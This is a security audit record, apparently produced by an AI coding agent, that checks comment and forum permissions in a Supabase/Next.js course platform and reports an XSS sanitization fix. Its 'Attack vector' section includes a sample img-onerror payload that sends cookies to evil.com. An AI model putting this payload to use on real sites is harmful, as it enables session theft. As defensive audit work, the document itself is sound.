---
title: "F9.11 — Audit: Comments + Forum Permissions"
type: research
created: 2026-05-08
agent: sites-dev-beta (Rex-S)
tags: [audit, security, comments, forum, rls, xss]
---

# F9.11 — Audit: Comments + Forum Permissions

## Summary

All 5 ACs verified. One P1 bug found and fixed (XSS — forum content not sanitized). One design gap documented (pinComment for MENTOR not implemented). No P0 issues.

---

## AC1 — Comment CRUD (own only, anti-IDOR)

**Status: PASS**

`src/lib/actions/comments.ts`:

- `addComment`: `requireUser()` → `has_access(user.id, lessonId)` RPC check → insert with `author_id: user.id`. IDOR impossible — author_id sourced from session, not client payload.
- `editComment`: `requireUser()` → fetch comment → `comment.author_id !== user.id` check (L68) → update. 15-minute edit window enforced (L70-71). IDOR blocked server-side.
- `deleteComment`: `requireUser()` → fetch comment → checks `isPrivileged || comment.author_id === user.id` (L109). Soft delete via `deleted_at`. IDOR blocked.

RLS backup (`20260506023754` migration): UPDATE policy has both `using` and `with check (author_id = auth.uid() or is_admin())` — defence in depth confirmed.

## AC2 — MENTOR/ADMIN moderation in comments

**Status: PARTIAL — design gap, not a bug**

- `deleteComment` correctly allows MENTOR and ADMIN to soft-delete any comment (L99, L109).
- Badge "Mentor"/"Admin" displayed in `CommentsSection.tsx` via `ROLE_BADGE` (L14-18).
- **Gap**: No `pinComment` action exists. The story mentions MENTOR can "fixar" (`is_pinned=true`) but there is no Server Action implementing this. `is_pinned` is read in the UI (CommentsSection line 93) and in the aula page query (line 250), but no write path exists. This is a **missing feature, not a security bug** — no privilege escalation is possible.

**Recommendation:** Create `pinComment(commentId)` action scoped to MENTOR/ADMIN (`requireRole(['MENTOR','ADMIN'])`). Low priority — P3.

`admin/forum/actions.ts`:
- `moderateThread`/`moderateReply`: `requireAdmin()` guard ✅, soft delete via `deleted_at` ✅. Only ADMIN path (not MENTOR) — consistent with RLS policy.

## AC3 — supabaseAdmin in student paths — justification

**Status: PASS (justified)**

Uses of `supabaseAdmin` in student paths audited:

| Location | Usage | Justification |
|---|---|---|
| `aula/page.tsx:91` | Fetch all modules/lessons for nav | `requireUser()` + cohort gate already passed. Read-only, no PII, needed for cross-module nav. ✅ |
| `aula/page.tsx:246` | Fetch comments for lesson | `has_access` RPC already confirmed. Listing all comments for a lesson the user has access to is correct. ✅ |
| `aula/page.tsx:275` | Fetch materials for lesson | Same gate as above — access confirmed before this point. ✅ |
| `forum/page.tsx:42-94` | Fetch categories + threads + counts | `requireUser()` + active membership check redirect already passed (L38-40). Read-only listing. ✅ |
| `forum/[category]/[slug]/page.tsx:56-136` | Fetch thread + replies + counts | `requireUser()` called (L54). Thread filtered by `deleted_at is null`. ✅ |
| `forum/actions.ts — createThread/createReply` | INSERT with author_id from session | `requireActiveMember()` validates active membership. `author_id` always `userId` from session. ✅ |

**Pattern confirmed:** `supabaseAdmin` is used exclusively for read operations after the security gate has been crossed, and for write operations where `author_id` is always sourced from `requireUser()`/`requireActiveMember()`. No bypass risk.

## AC4 — Forum gate + ban mechanism

**Status: PASS (forum gate) + NOTED (ban mechanism)**

**Forum gate:**
- `forum/page.tsx:31-40`: `createClient()` (RLS-scoped) queries `cohort_members` for `status='ACTIVE'` — redirect if not member. ✅
- `forum/actions.ts:requireActiveMember()` (L9-25): same check in all write actions — `createThread`, `createReply`, `voteThread`, `markAsAccepted`. ✅

**Ban mechanism:**
- Supabase Auth `ban_duration` (via `updateUserById`) is the ban primitive — set in `admin/usuarios/actions.ts:banUser` (100 years) / `unbanUser`.
- A banned user cannot authenticate → `requireUser()` redirects to login → cannot post. ✅
- The ban works at the auth layer, not at the forum layer. No `is_banned` field in `cohort_members` — the Supabase Auth ban is the single source of truth. This is clean design.
- `admin/usuarios/page.tsx:31`: `banned_until` from `listUsers` surfaces ban status in admin UI. ✅

## AC5 — Soft delete consistency

**Status: PASS**

- `comments`: soft delete via `deleted_at` in `deleteComment`. Query in `aula/page.tsx:254`: `.is('deleted_at', null)`. `CommentsSection.tsx:49-57`: `comment.deleted_at` shows "[comentário removido]". ✅
- `forum_threads`: soft delete via `deleted_at` in `moderateThread`. Queries filter `.is('deleted_at', null)`. ✅
- `forum_replies`: soft delete via `deleted_at` in `moderateReply`. Queries filter `.is('deleted_at', null)`. ✅
- Hard-delete path: `admin/forum/page.tsx` + `ForumModerationClient.tsx` — admin can restore (undelete). No hard-delete UI exposed — acceptable for MVP.

---

## BUG FIXED — P1: Forum content not sanitized (XSS)

**Severity:** P1
**Files:** `src/app/(academy)/academy/(student)/forum/actions.ts`

**Issue:** `createThread` and `createReply` inserted raw `content` string to DB without sanitization. `comments.ts` correctly calls `sanitizeHtml()` on every write, but `forum/actions.ts` did not import or call it.

**Attack vector:** A member posts `<img src=x onerror="document.location='https://evil.com?c='+document.cookie">` in a thread. All viewers of that thread page would be affected (thread content rendered via `{thread.content}` — `whitespace-pre-wrap` paragraph, React escapes plain text, but if admin later renders as HTML it would execute).

Note: React's JSX rendering (`<p className="whitespace-pre-wrap">{thread.content}</p>`) does escape HTML entities — so the immediate XSS risk is lower than it appears. However, sanitizing at write time is the correct defense-in-depth approach: the DB should never store raw HTML from user input, regardless of how the renderer handles it. Sanitizing now prevents future regressions if the renderer changes.

**Fix applied:** Added `import { sanitizeHtml } from '@/lib/content'` and wrapped `content` with `sanitizeHtml(parsed.data.content)` in both `createThread` (L65) and `createReply` (L100). Typecheck: clean.

---

## Remaining gaps (non-blocking, P3)

- **pinComment action missing:** No Server Action to set `is_pinned=true` on a comment for MENTOR/ADMIN. The UI shows the pin badge but no user can set it. Low priority — create story.
- **forum thread content not sanitized on edit:** No edit action for threads/replies exists. If added in future, must include sanitizeHtml.
- **MENTOR moderation in forum:** `admin/forum/actions.ts` only uses `requireAdmin()` — MENTORs cannot moderate threads/replies via admin UI. Story AC2 mentions "MENTOR pode fixar" — currently only ADMIN has moderation rights. Document as design decision or create story for MENTOR moderation.

---

## Files audited

- `src/lib/actions/comments.ts`
- `src/app/(academy)/academy/(student)/forum/actions.ts` — **FIXED**
- `src/app/(academy)/academy/(admin)/admin/forum/actions.ts`
- `src/app/(academy)/academy/(admin)/admin/usuarios/actions.ts`
- `src/app/(academy)/academy/(student)/forum/page.tsx`
- `src/app/(academy)/academy/(student)/forum/[category]/[slug]/page.tsx`
- `src/app/(academy)/academy/(student)/curso/[slug]/aula/[lesson-slug]/page.tsx` (L246-281)
- `src/components/student/CommentsSection.tsx`
- `src/lib/content/html.ts`
- `src/lib/auth/helpers.ts`
- `supabase/migrations/20260506022037_has_access_rls_policies.sql` (L376-528)
- `supabase/migrations/20260506023754_fix_rls_privilege_escalation_and_missing_checks.sql` (L64-92)
